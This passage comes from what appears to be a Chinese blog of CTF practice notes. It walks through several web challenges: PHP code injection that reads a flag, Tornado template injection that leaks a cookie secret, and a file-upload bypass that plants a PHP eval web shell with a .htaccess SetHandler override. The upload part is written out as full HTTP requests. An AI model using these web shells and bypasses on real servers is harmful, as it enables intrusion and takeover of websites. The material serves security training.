class="hljs-string">&quot;lib&quot;</span> [<span class="hljs-number">10</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;lib64&quot;</span> [<span class="hljs-number">11</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;media&quot;</span> [<span class="hljs-number">12</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;mnt&quot;</span> [<span class="hljs-number">13</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;opt&quot;</span> [<span class="hljs-number">14</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;proc&quot;</span> [<span class="hljs-number">15</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;root&quot;</span> [<span class="hljs-number">16</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;run&quot;</span> [<span class="hljs-number">17</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;sbin&quot;</span> [<span class="hljs-number">18</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;srv&quot;</span> [<span class="hljs-number">19</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;start.sh&quot;</span> [<span class="hljs-number">20</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;sys&quot;</span> [<span class="hljs-number">21</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;tmp&quot;</span> [<span class="hljs-number">22</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;usr&quot;</span> [<span class="hljs-number">23</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;var&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>读取flag：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node5.buuoj.cn:<span class="hljs-number">28453</span>/calc.php?%<span class="hljs-number">20</span>num=var_dump(file_get_contents(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)))<br><br><span class="hljs-attribute">string</span>(<span class="hljs-number">43</span>) <span class="hljs-string">&quot;flag&#123;89404a0c-0948-4a18-9f87-40f1050cc23f&#125; &quot;</span><br></code></pre></td></tr></table></figure><h2 id="notice"><a href="#notice" class="headerlink" title="notice:"></a>notice:</h2><p>scandir( )<br>这是一个在C语言中用于扫描目录内容的函数，它允许开发者检索目录中的文件和子目录信息。这个函数在Linux系统编程中非常有用，尤其是当你需要处理文件系统或者进行目录操作时。</p><p>var_dump( )：<br>这是PHP的一个内置函数，用于输出变量的详细信息，包括类型和值。</p><p>file_get_contents( )：<br>这是PHP的一个内置函数，用于读取文件内容并返回为字符串。</p><p>chr( )：<br>这是PHP的一个内置函数，用于将ASCII码值转换为对应的字符。</p><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>模板注入题<br>没接触过，想直接去看wp了<br><a href="https://blog.csdn.net/m0_73734159/article/details/134360691">https://blog.csdn.net/m0_73734159/article/details/134360691</a><br>很详细，  </p><p>记一回tornado模板注入，虽然没做过两道模板注入的题  </p><p>点开flag看到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">/flag.txt<br>flag <span class="hljs-keyword">in</span> /fllllllllllllag<br><br>url:/file?filename=/flag.txt&amp;filehash=02521e013bf12f2ed07267cbbb4476da<br></code></pre></td></tr></table></figure><p>修改filehash:<br>&#x2F;error?msg&#x3D;Error<br>验证完后确定使用tornado模板注入（wp）  </p><p>查看hint得到计算公式 md5(cookie_secret+md5(filename))<br>知道要拿到cookie_secret,<br>用handler.sttings查看环境变量  </p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;<span class="hljs-number">42b45411</span>-b944-<span class="hljs-number">4058</span>-a294-92333eecacef&#x27;&#125;<br></code></pre></td></tr></table></figure><p>计算hash值<br>md5(&#x2F;fllllllllllllag)&#x3D;3bf9f6cf685a6dd8defadabfb41a03a1<br>cookie_secret&#x3D;42b45411-b944-4058-a294-92333eecacef<br>md5(md5(&#x2F;fllllllllllllag)+cookie_secret)&#x3D;baf2694028f23612a3c77cb63b9b9dd8</p><p>最后payload：<br>&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;baf2694028f23612a3c77cb63b9b9dd8</p><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>这题的note写过了，本替换搞没了，这次就独立做过当温习吧<br>开局艾克和孙笑川，jpeg直接传也传不了，文件有1m限制，<br>题目一直不提示改上传什么类型的文件有点难受，<br>最后试出来mmie传 image&#x2F;png 就行<br>直接传了  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>411<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryPX5AuupbBQqkGiE6<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=40c31c5302fc21595b5a1fb9e36ac7ff<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;php.png&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">一键去世</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryPX5AuupbBQqkGiE6--</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-built_in">Warning</span>: mkdir(): File <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> /var/www/html/upload.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">23</span></span><br><span class="language-pgsql">/var/www/html/upload/c27817d096552162de80b210a4855ce1/php.png succesfully uploaded!</span><br></code></pre></td></tr></table></figure><p>直接蚁剑访问访问不了，应该就是目录不会进行php解析的原因<br>利用.htaccess,上传.htaccess文件</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>340<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryvBTzoKhzTjekoPjH<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=40c31c5302fc21595b5a1fb9e36ac7ff<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">SetHandler application/x-httpd-php</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">一键去世</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryvBTzoKhzTjekoPjH--</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-built_in">Warning</span>: mkdir(): File <span class="hljs-keyword">exists</span> <span class="hljs-keyword">in</span> /var/www/html/upload.php <span class="hljs-keyword">on</span> <span class="hljs-type">line</span> <span class="hljs-number">23</span></span><br><span class="language-pgsql">/var/www/html/upload/c27817d096552162de80b210a4855ce1/.htaccess succesfully uploaded!</span><br></code></pre></td></tr></table></figure><p>蚁剑访问<br><a href="http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/upload/c27817d096552162de80b210a4855ce1/php.png">http://4f3fe5aa-8e67-4790-9789-62a2f46c45c4.node5.buuoj.cn:81/upload/c27817d096552162de80b210a4855ce1/php.png</a><br>成功  </p><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>漏洞详情：<br><a href="https://blog.csdn.net/weixin_44032232/article/details/108998564">https://blog.csdn.net/weixin_44032232/article/details/108998564</a></p><h1 id="ACTF-upload（未解出）"><a href="#ACTF-upload（未解出）" class="headerlink" title="ACTF upload（未解出）"></a>ACTF upload（未解出）</h1><p>又跑去actf坐牢了😭，做不出来也把进度放这</p><p>先要注册用户来登录，试了admin账户，服务器不给  </p><p>传正常图片<br><a href="http://223.112.5.141:63478/upload?file_path=9db39573-994f-464f-b1fe-97c1e9897fb9_test.jpeg">http://223.112.5.141:63478/upload?file_path=9db39573-994f-464f-b1fe-97c1e9897fb9_test.jpeg</a><br>访问正常回显图片  </p><p>传马：<br><a href="http://223.112.5.141:63478/upload?file_path=5ce41be5-7154-493f-b21b-84dd6a200111_php.php">http://223.112.5.141:63478/upload?file_path=5ce41be5-7154-493f-b21b-84dd6a200111_php.php</a><br>不回显代码，回显：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png;base64,PHNjcmlwdCBsYW5ndWFnZT0ncGhwJz5ldmFsKCRfR0VUWyJ6Il0pOzwvc2NyaXB0Pg==&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Uploaded Image&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>是base64编码后的马<br>试一下直接上传base64：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+<br></code></pre></td></tr></table></figure><p>不行  </p><p>看一下d导的分析：  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml">关键分析<br>服务器处理逻辑：<br><br>上传的内容被包裹在 <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;data:image/png;base64,...&quot;</span>&gt;</span> 中，说明服务器将文件内容强制转换为 Base64 图片。<br><br>但返回的 Base64 数据 (PHNjcmlwdCBsYW5ndWFnZT0ncGhwJz5ldmFsKCRfR0VUWyJ6Il0pOzwvc2NyaXB0Pg==) 解码后正是你上传的原始代码：<br><br>php<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&quot;z&quot;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>这意味着服务器可能同时做了两件事：<br><br>将文件内容保存到磁盘（如 uploads/shell.php）。<br><br>生成一个包含该内容的 Base64 图片用于前端展示。<br><br>潜在漏洞点：<br><br>如果服务器保存了原始文件（如 .php），且文件名可控，可直接访问该文件执行代码。<br><br>如果服务器仅返回 Base64 图片但未保存原始文件，需另寻他法。<br></code></pre></td></tr></table></figure><p>试一下对upload文件  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">223.112</span>.<span class="hljs-number">5.141</span>:<span class="hljs-number">63478</span><span class="hljs-regexp">/upload?file_path=flag.txthttp:/</span><span class="hljs-regexp">/223.112.5.141:63478/u</span>pload?file_path=flag.txt<br></code></pre></td></tr></table></figure><p>对upload试了一下目录穿越，不行，  </p><p>伪协议<br>encode，无法读取文件，<br>decode，无法读取文件</p><p>注意到无论上传什么文件服务器默认当作imag&#x2F;png文件处理</p><p><a href="http://223.112.5.141:53908/upload?file_path=http://127.0.0.1/flag.txt">http://223.112.5.141:53908/upload?file_path=http://127.0.0.1/flag.txt</a><br>不行<br>放弃了，等wp  </p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>note-30</title>
    <link href="/2025/04/23/note-30/"/>
    <url>/2025/04/23/note-30/</url>
    
    <content type="html"><![CDATA[<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>扫目录一直扫不出来，扫了十来次，最后发现是是请求太快，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirsearch</span> -u http://<span class="hljs-number">087</span>da459-<span class="hljs-number">7</span>de3-<span class="hljs-number">4061</span>-<span class="hljs-number">82</span>c8-b3cf69426d11.node5.buuoj.cn:<span class="hljs-number">81</span>/ -w backup_include.txt --delay=<span class="hljs-number">1</span> -t <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>终于发现备份文件<br>&#x2F;index.php.bak  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;  <span class="hljs-comment">//检查字符串是否只以数字构成，就是只能上传数字</span><br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="弱比较-强比较"><a href="#弱比较-强比较" class="headerlink" title="弱比较 强比较"></a>弱比较 强比较</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">在进行比较的时候 会先将两种参数类型转化成相同<br><br>如果为整型跟字符型比较 那么字符将从左往右提取整型直到遇到字符结束 再比较。<br><br>若字符型为数字中间包含了一个e或E 则e或E会被科学计数法的标记<br><br>而数字中间包含了一个. 也会被看作为小数点<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_51196842/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120591289</span><br><br></code></pre></td></tr></table></figure><p>然后上网查intval函数绕过<br>intval函数在处理字符串时以数字开头遇到第一个字母时会停止。</p><p>大概就是弱比较会将不同数据类型，然后$key被转化类型会变成 123，<br>然后get传 123 进index即可</p><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>直接拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span 